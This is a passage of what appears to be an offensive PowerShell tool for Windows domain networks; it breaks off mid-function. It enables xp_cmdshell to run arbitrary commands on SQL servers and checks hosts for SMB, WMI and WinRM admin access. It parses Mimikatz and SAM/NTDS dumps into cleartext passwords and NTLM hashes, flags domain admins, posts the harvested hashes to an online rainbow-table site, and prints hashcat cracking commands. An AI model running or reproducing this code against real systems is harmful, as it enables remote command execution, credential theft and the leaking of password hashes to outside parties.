                if ($advancedOptionsConfig.value_in_use -eq 0) {
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'show advanced options', 1; RECONFIGURE;"
                    $revertAdvancedOptions = $true
                }

                # Enable 'xp_cmdshell' if needed
                if ($xpCMDConfig.value_in_use -eq 0) {
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
                    $revertXpCMDShell = $true
                }

                # Execute the provided command using xp_cmdshell
                $ExecResult = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "EXEC xp_cmdshell '$Command';"

                # Output the result as formatted text
                if ($ExecResult) {
                    $TrimmedResult = $ExecResult | Format-Table -HideTableHeaders | Out-String | ForEach-Object { $_.Trim() }
                    $TrimmedResult | Write-Output
    
                }
                else {
                    Write-Host "No output was returned from the command."
                }

                # Revert 'xp_cmdshell' if it was changed
                if ($revertXpCMDShell) {
                    Revert-Config -Option "xp_cmdshell" -Value 0
                }

                # Revert 'Show Advanced Options' if it was changed
                if ($revertAdvancedOptions) {
                    Revert-Config -Option "show advanced options" -Value 0
                }
            }

            # Start Impersonation (if required)
            if (!$LocalAuth -and $Username -ne "" -and $Password -ne "") {
                Invoke-Impersonation -Username $Username -Password $Password -Domain $Domain
            }

            function SQLAdminCheck {
                [CmdletBinding()]
                param(
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,
        
                    [Parameter(Mandatory = $false)]
                    [string]$Username,
        
                    [Parameter(Mandatory = $false)]
                    [string]$Password
                )

                try {
                    # Create and open SQL connection
                    Write-Verbose "Opening SQL connection to $NamedInstance"
                    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
                    $SqlConnection.ConnectionString = $ConnectionString
                    $SqlConnection.Open()
        
                    # Create SQL command to check sysadmin membership
                    $SqlCommand = $SqlConnection.CreateCommand()
                    $SqlCommand.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
                    $IsSysAdmin = $SqlCommand.ExecuteScalar()
        
                    # Check if the user is a sysadmin
                    if ($IsSysAdmin -eq "1") {
                        $SYSADMIN = $True
                        if ($Command -ne "") {
                            # Execute the provided command
                            return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
                        }
                        else {
                            return "SUCCESS SYSADMIN"
                        }
                    }
                    elseif ($IsSysAdmin -eq "0") {
                        $SYSADMIN = $False
                        return "SUCCESS NOT SYSADMIN"
                    }
                    else {
                        $SYSADMIN = $False
                        return "ERROR"
                    }
                }
                catch {
                    Write-Error "Error occurred on $NamedInstance`: $_"
                    return $null
                }
                finally {
                    # Close SQL connection and clear pool
                    if ($SqlConnection -and $SqlConnection.State -eq 'Open') {
                        $SqlConnection.Close()
                        [System.Data.SqlClient.SqlConnection]::ClearAllPools()
                    }
                }
            }


            function Test-SqlConnection {
                [CmdletBinding()]
                param (
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance
                )
                if (!$LocalAuth) {
                    $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
                }
                elseif ($LocalAuth) {
                    $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
                }

                $connection = New-Object System.Data.SqlClient.SqlConnection
                $connection.ConnectionString = $ConnectionString
    
                try {
                    $connection.Open()
                    if ($connection.State -eq 'Open') {
                        if ($Username -ne "" -and $Password -ne "") {
                            return SQLAdminCheck -Username "$Username" -Password "$Password" -NamedInstance "$NamedInstance"
                        }
                        else {
                            return SQLAdminCheck -NamedInstance $NamedInstance
            
                        }
                    }
                }
                catch {
                    if ($_.Exception.Message -like "*Login failed for user*") { return "Access Denied" }
                    elseif ($_.Exception.Message -like "*error: 26*") { return "Unable to connect" }
                    elseif ($_.Exception.Message -like "*error: 40*") { return "Unable to connect" }
                    else { return "ERROR" }
                }
                finally {
                    if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) {
                        Invoke-Impersonation  -RevertToSelf
                    }
                    $connection.Close()
                    [System.Data.SqlClient.SqlConnection]::ClearAllPools()
                }
            }

            $ComputerNameFromInstance = $NamedInstance.Split('\')[0]
            try {
                $IP = $null
                $Ping = New-Object System.Net.NetworkInformation.Ping 
                $IPResult = $Ping.Send($ComputerNameFromInstance, 10)
                if ($IPResult.Status -eq 'Success') {
                    $IP = $IPResult.Address.IPAddressToString
                }
            }

            Catch { $IP = " " * 16 }
            return (Test-SqlConnection -NamedInstance $NamedInstance), $IP

            # revert impersonation (if required)
            if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) { Invoke-Impersonation  -RevertToSelf }
        }

        foreach ($NamedInstance in $AllInstances) {


    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace  = $runspace
                    Handle    = $runspace.BeginInvoke()
                    Instance  = $NamedInstance
                    Completed = $false
                })

        }

        $InstanceLength = ($AllInstances | ForEach-Object { $_.Length } | Measure-Object -Maximum).Maximum

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $runspaceData = $runspace.Runspace.EndInvoke($runspace.Handle)
            
                    $result = $runspacedata[0]
                    $IP = $runspacedata[1]
            
                    $SysAdminFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-SYSADMIN-Accessible-MSSQL-Instances.txt")
                    $AccessibleFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-Accessible-MSSQL-Instances.txt")
            
                    if (!$Username) { $Username = $env:username }
                    if ($result -eq "Unable to connect") { continue }

                    if ($result -eq "Access Denied") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    if ($result -eq "ERROR") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR - $Result" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    elseif ($result -eq "Success") {
                        Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        continue            
                    }

                    elseif ($result -eq "SUCCESS SYSADMIN") {
                        Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$SysAdminFilePath" -Encoding "ASCII" -Force
                        continue            
                    }
           
            
                    elseif ($result -eq "SUCCESS NOT SYSADMIN") {
                        Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        continue            
                    }

                    elseif ($Command -ne "" -and $Result -ne "") {
                        Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        Write-Output ""
                        Write-output $Result
                        Write-Output ""
                        continue
                    }

                    elseif ($result -like "*untrusted domain and cannot be used with Windows authentication*") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "Untrusted Domain" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()

        if (Test-Path -Path $SysAdminFilePath) {
            Get-Content -Path $SysAdminFilePath |
            Sort-Object -Unique |
            Set-Content -Path $SysAdminFilePath
        }

        if (Test-Path -Path $AccessibleFilePath) {
            Get-Content -Path $AccessibleFilePath |
            Sort-Object -Unique |
            Set-Content -Path $AccessibleFilePath
        }


    }

    ################################################################################################################
    ################################################ Function: All #################################################
    ################################################################################################################
    Function Method-all {
        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Domain, $Timeout)

            Function Test-Port {
                param ($ComputerName, $Port)
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
                $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

                if ($wait) {
                    try {
                        $tcpClient.EndConnect($asyncResult)
                        return $true
                    }
                    catch {
                        return $false
                    }
                }
                else {
                    return $false
                }
            }

            # Check Ports
            $WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
            $WMIPort = Test-Port -ComputerName $ComputerName -Port 135
            $SMBPort = Test-Port -ComputerName $ComputerName -Port 445


            # if all three fail, return and kill the runspace
            if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
                return "Unable to connect"
            }

            # SMB Check
            if ($SMBPort) {
                $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction SilentlyContinue
                if (-not $SMBCheck) {
                    $SMBAccess = $False
                }
                else {
                    $SMBAccess = $True
                }
            }

            # WMI Check
            if ($WMIPort) {
                try {
                    Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction Stop
                    $WMIAccess = $True
                }
                catch {
                    $WMIAccess = $False
                }
            }

            # WinRM Check
            if ($WinRMPort) {
                try {
                    Invoke-Command -ComputerName $computerName -ScriptBlock { echo "Successful Connection PME" } -ErrorAction Stop
                    $WinRMAccess = $True
                }
                catch {
                    if ($_.Exception.Message -like "*Access is Denied*") {
                        $WinRMAccess = $False
                    }
                    elseif ($_.Exception.Message -like "*cannot be resolved*") {
                        $WinRMAccess = $False
                    }
                }
            }

            return @{
                WMIAccess   = $WMIAccess
                SMBAccess   = $SMBAccess
                WinRMAccess = $WinRMAccess
            }
        }

    

        # Create and invoke runspaces for each computer
        foreach ($computer in $computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                
                    if ($result -eq "Unable to connect") { continue }

                    # Build string of successful protocols
                    $successfulProtocols = @()
                    if ($result.SMBAccess -eq $True) { $successfulProtocols += "SMB" }
                    if ($result.WinRMAccess -eq $True) { $successfulProtocols += "WinRM" }
                    if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }

                    if ($successfulProtocols.Count -gt 0) {
                        $statusText = $successfulProtocols -join ', '
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText $statusText -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
                    else {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ################################################# Function: AdminCount #########################################
    ################################################################################################################

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    ################################################################################################################
    ############################################ Function: RainbowCheck ############################################
    ################################################################################################################

    Function RainbowCheck {
        param ($Module, $RCFilePath)

        if (-not (Test-Path -Path $RCFilePath)) {
            Write-Warning "The file at '$RCFilePath' does not exist."
            return
        }

        if (!(Get-Content -Path $RCFilePath)) {
            Write-Warning "The file at '$RCFilePath' is empty."
            return
        }

        function Rainbow-SAM {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^\[(.+?)\](.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
                    $hostname = $matches[1] -replace '^\[|\]$', ''  # Remove brackets from the hostname
                    $username = $matches[2]
                    $ntHash = $matches[3]
                    New-Object PSObject -Property @{
                        Hostname = $hostname
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        function Rainbow-LogonPasswords {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^(.+?)\\(.+?):([a-f0-9A-F]{32})$") {
                    $domain = $matches[1]
                    $username = $matches[2]
                    $ntHash = $matches[3]
                    New-Object PSObject -Property @{
                        Domain   = $domain
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        function Rainbow-NTDS {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^(.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
                    $username = $matches[1]
                    $ntHash = $matches[2]
                    New-Object PSObject -Property @{
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }


        $NTLMpwURL = "https://ntlm.pw/" 

        $parsedData = switch ($Module) {
            "SAM" { Rainbow-SAM -FilePath $RCFilePath }
            "LogonPasswords" { Rainbow-LogonPasswords -FilePath $RCFilePath }
            "NTDS" { Rainbow-NTDS -FilePath $RCFilePath }
        }

        # Group users by their NTLM hash
        $groupedHashEntries = $parsedData | Group-Object NTHash

        # Construct the POST request body with the NT hashes (unique hashes only)
        $hashesBody = ($groupedHashEntries.Name -join "%0D%0A")

        # Send a POST request to the server
        $response = Invoke-WebRequest -Uri $NTLMpwURL -Method Post -Body "hashes=$hashesBody" -ContentType "application/x-www-form-urlencoded" -UseBasicParsing

        if ($response.StatusCode -eq 200) {
            $htmlContent = $response.Content

            $pattern = "<tr>\s*<td class=`"font-monospace`">\s*<h6>(.+?)</h6>\s*</td>\s*<td>\s*<h6>(.+?)</h6>\s*</td>\s*</tr>"
            $matches = Select-String -InputObject $htmlContent -Pattern $pattern -AllMatches
            
            $results = if ($matches.Matches.Count -gt 0) {
                $matches.Matches | ForEach-Object {
                    $hash = $_.Groups[1].Value
                    $password = $_.Groups[2].Value
            
                    if ($password -ne "[not found]") {
                        $groupedHashEntries | Where-Object { $_.Name -eq $hash } | ForEach-Object {
                            $_.Group | ForEach-Object {
                                New-Object -TypeName PSObject -Property @{
                                    Hostname = $_.Hostname
                                    Domain   = $_.Domain
                                    Username = $_.Username
                                    Hash     = $hash
                                    Password = $password
                                }
                            }
                        }
                    }
                }
            } 

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Checking collected hashes against an online rainbow table"

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Only values for which the password is known will be shown"

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "URL: $NTLMpwURL"

            Write-Host

            switch ($Module) {
                "SAM" {
                    $sortedResults = $results | Sort-Object Hostname
                    $sortedResults | Format-Table -Property Hostname, Username, Hash, Password -AutoSize
                }
                "LogonPasswords" {
                    $sortedResults = $results | Sort-Object Username
                    $sortedResults | Format-Table -Property Domain, Username, Hash, Password -AutoSize
                }
                "NTDS" {
                    $sortedResults = $results | Sort-Object Username
                    $sortedResults | Format-Table -Property Username, Hash, Password -AutoSize
                }
            }
        } 
        elseif ($response.StatusCode -eq 429) { Write-Warning "Quota Exceeded on lookup" }
        else { Write-Warning "Error communicating with $NTLMpwURL" }
    }

    ################################################################################################################
    ################################################## Function: Parse-SAM #########################################
    ################################################################################################################
    function Parse-SAM {
        $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
        if (-not $SamFull) {
            New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
        }

        $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
        $lines = @{}

        foreach ($file in $files) {
            $fileLines = Get-Content $file

            foreach ($line in $fileLines) {
                if ([string]::IsNullOrWhiteSpace($line)) {
                    continue
                }

                $lineParts = $line -split ':'
                $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
                $computer = $file.BaseName -split '\.' | Select-Object -First 1
                $computerFormed = "{0}" -f $computer

                if ($lines.ContainsKey($lineWithoutNumber)) {
                    $lines[$lineWithoutNumber] += "," + $computerFormed
                }
                else {
                    $lines[$lineWithoutNumber] = $computerFormed
                }
            }
        }

        $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
        if ($duplicateLines) {
        
            Write-Host
            Write-Host
            Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
            Write-Host
        
            foreach ($duplicate in $duplicateLines) {
                $line = $duplicate.Key
                $computers = $duplicate.Value -split ','
            
                Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
                Write-Host "$line::"
                Write-Host
            }
        }

        Write-Host
        Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
        Write-Host

        Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $Computer = $_.BaseName -split '\.' | Select-Object -First 1
            $ComputerFormed = "[{0}]" -f $Computer
            $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
            $content = Get-Content $_.FullName -Verbose
            $output = foreach ($line in $content) {
                $trimmedLine = $line.Trim()
                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
                    $ComputerFormed + $trimmedLine
                }
            }
            $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
        }

        Start-Sleep -Seconds "3"
    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort-Object | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
        Get-Content "$SAM\.Sam-Full.txt"

        Write-Host ""
        Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host ""
    
        if ($Rainbow) {
            RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.Sam-Full.txt"
        }
    }


    ################################################################################################################
    ################################################# Function: Parse-LogonPassword ################################
    ################################################################################################################
    function Parse-LogonPasswords {
        Write-Host
        Write-Host
        Write-Host "Parsing Results" -ForegroundColor "Yellow"
        Write-Host
        Start-Sleep -Seconds 1

        function Parse-LogonPassword {
            param (
                [string]$raw
            )


            $userInfo = @{}

            function Process-Match {
                param ([string]$match)

                $username = $domain = $NTLM = $password = $null

                foreach ($line in $match.Split("`n")) {
                    switch -Regex ($line) {
                        "Username" { $username = $line.Split(":")[1].Trim() }
                        "Domain" { 
                            # Extracting the domain and keeping only the NetBIOS name
                            $domain = $line.Split(":")[1].Trim()
                            $domain = ($domain -split "\.")[0]
                        }
                        "NTLM" { $NTLM = $line.Split(":")[1].Trim() }
                        "Password" { $password = ($line -split ":", 2)[1].Trim() }
                    }
                }

                if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                    $identity = "$domain\$username"

                    if (-not $userInfo.ContainsKey($identity)) {
                        $userInfo[$identity] = @{}
                    }

                    if ($NTLM) {
                        $userInfo[$identity]["NTLM"] = $NTLM
                    }

                    if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                        $userInfo[$identity]["Password"] = $password
                    }
                }
            }

            $patterns = @(
                "(?s)(?<=msv :).*?(?=tspkg :)",
                "(?s)(?<=tspkg :).*?(?=wdigest :)",
                "(?s)(?<=wdigest :).*?(?=kerberos :)",
                "(?s)(?<=kerberos :).*?(?=ssp :)"
            )

            foreach ($pattern in $patterns) {
                $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                    $_.Matches.Value | ForEach-Object {
                        if ($_ -match "Domain") {
                            Process-Match -match $_
                        }
                    }
                }
            }

            foreach ($identity in $userInfo.Keys) {
                [PSCustomObject]@{
                    Identity = $identity
                    NTLM     = $userInfo[$identity]["NTLM"]
                    Password = $userInfo[$identity]["Password"]
                    Notes    = ""
                }
            }
        }

        # Directory path where the text files are located.
        $LogonPasswordPath = "$LogonPasswords"

        # Retrieve all text files from the directory.
        $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt

        # Create DirectorySearcher object outside the loop
        $Searcher = New-Searcher -domain "$Domain"

        # Loop through each file in the directory.
        foreach ($File in $Files) {
            # Extract computer name (DNS Hostname) from the file name using regex.
            $Computer = $File.BaseName -replace "-LogonPasswords$", ""

            Write-Host
            Write-Host "-[$Computer]-"
            Write-Host

            # Retrieve the content of the current file.
            $FileOutput = Get-Content -Raw -Path $File.FullName

            # Parse the Mimikatz output and include ComputerName.
            $ParsedResults = Parse-LogonPassword -raw $FileOutput
            # Update each user's notes if they have an AdminCount of 1
            foreach ($user in $ParsedResults) {
                if ($null -ne $user.Identity) {
                    $username = $user.Identity.Split('\')[1]
                    if (AdminCount -UserName $username -Searcher $Searcher) {
                        $user.Notes = "[AdminCount=1] "
                    }
                }
            }

            $ParsedResults |
            Where-Object { $_.NTLM -or $_.Password } |
            ForEach-Object {
                $notesAdditions = @()
                New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
                $ComputerDirectory = "$LogonPasswords\$Computer"

                $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity

                if ($userName -in $DomainAdmins) { $notesAdditions += "[Domain Admin] " }
                if ($userName -in $EnterpriseAdmins) { $notesAdditions += "[Enterprise Admin] " }
                if ($userName -in $ServerOperators) { $notesAdditions += "[Server Operator] " }
                if ($userName -in $AccountOperators) { $notesAdditions += "[Account Operator] " }

                # Check if NTLM value indicates an empty password
                if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notesAdditions += "[NTLM=Empty Password] "
                }

                if ($($_.Password) -ne $null) {
                    # Extract username from Identity
                    $userName = ($_.Identity -split '\\')[1]  

                    # Check if username does not end with $
                    if ($userName -notmatch '\$$') {
                        $notesAdditions += "[Cleartext Password] "
                    }
                }

                $_.Notes += ($notesAdditions -join ' ')

                Write-Host "Username  : $($_.Identity.ToLower())"
                Write-Host "NTLM      : $($_.NTLM)"
                if ($($_.Password) -eq $null) {} Else { Write-Host "Password  : $($_.Password)" }
                if (($_.Notes) -eq "") {} Else {
                    Write-Host "Notes     : " -NoNewline

                    # Highlight notes in yellow if it contains specific flags
                    if ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password" ) {
                        Write-Host -ForegroundColor Yellow -NoNewline "$($_.Notes)"
                    }
                    else {
                        Write-Host -NoNewline "$($_.Notes)"
                    }
                    Write-Host ""
                    "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
                }
                Write-Host ""
            
                Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
            }
        }

        Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort-Object | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
        # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
        $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object { $_ -notmatch ":$" }
        $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

        # Print unique NTLM hashes within the banner
        Write-Host
        Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
        Write-Host
        Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
        Write-Host
        Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host 
        Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
        Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
        Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
        Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
        Write-Host

        if ($Rainbow) {
            RainbowCheck -Module "LogonPasswords" -RCFilePath "$LogonPasswords\.AllUniqueNTLM.txt"
        }
    }




    ################################################################################################################
    ################################################# Function: Parse-eKeys ########################################
    ################################################################################################################
    Function Parse-eKeys {
        Write-Host
        Write-Host
        Write-Host "Parsing Results" -ForegroundColor "Yellow"
        Write-Host
        Start-Sleep -Seconds "1"
        $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

        # Initialize the DirectorySearcher outside of the loop for better performance
        $domainSearcher = New-Searcher

        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
        
            New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$eKeys\$Computer"
        
            Write-Host
            Write-Host
            Write-Host "-[$Computer]-"
            Write-Host

            $filePath = $_.FullName
            $fileContent = Get-Content -Path $filePath -Raw
            Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

            $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
            $matches = [regex]::Matches($fileContent, $pattern)

            $uniqueGroups = @{}

            foreach ($match in $matches) {
                $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
                if (([regex]::Matches($password, ' ')).Count -gt 10) {
                    $password = "(Hex Value: Redacted)"
                }            
            
                $domainUsername = "$($domain.ToLower())\$username"
                $groupKey = $domainUsername

                if (!$uniqueGroups.ContainsKey($groupKey)) {
                    $notes = ""  # This will store the notes

                    # Check for non-null passwords and username not ending with $
                    if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                        $notes += "[Cleartext Password] "
                    }

                    $isAdminGroupMember = $DomainAdmins -contains $username -or
                    $EnterpriseAdmins -contains $username -or
                    $ServerOperators -contains $username -or
                    $AccountOperators -contains $username

                    # Do not display the adminCount if a user is a member of the specified groups
                    if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
                        $notes += "[AdminCount=1] "
                    }

                    # Check for Empty Password hash
                    if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                        $notes += "[rc4_hmac_nt=Empty Password] "
                    }

                    # Checks for group memberships
                    if ($DomainAdmins -contains $username) {
                        $notes += "[Domain Admin] "
                    }
                    if ($EnterpriseAdmins -contains $username) {
                        $notes += "[Enterprise Admin] "
                    }
                    if ($ServerOperators -contains $username) {
                        $notes += "[Server Operator] "
                    }
                    if ($AccountOperators -contains $username) {
                        $notes += "[Account Operator] "
                    }

                    $group = [PSCustomObject]@{
                        DomainUsername = $domainUsername
                        KeyList        = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                        Password       = $password
                        Notes          = $notes
                    }

                    $uniqueGroups[$groupKey] = $group

                    Write-Host "Username    : $domainUsername"
                    if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null) {} Else { Write-Host "Password    : $password" }

                    foreach ($key in $group.KeyList) {
                        if (![string]::IsNullOrWhiteSpace($key)) {
                            $keyParts = $key.Trim() -split '\s+'
                            Write-Host "$($keyParts[0]) : $($keyParts[1])"
                        }
                    }
                    if (-not [string]::IsNullOrWhiteSpace($notes)) {
                        Write-Host "Notes       : " -NoNewline
                        Write-Host $notes -ForegroundColor Yellow -NoNewline
                        Write-Host ""
                    }

                    Write-Host ""
                }
            }
        }

    }



    ################################################################################################################
    ############################################## Function: Parse-KerbDump ########################################
    ################################################################################################################

    function Parse-KerbDump {
        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
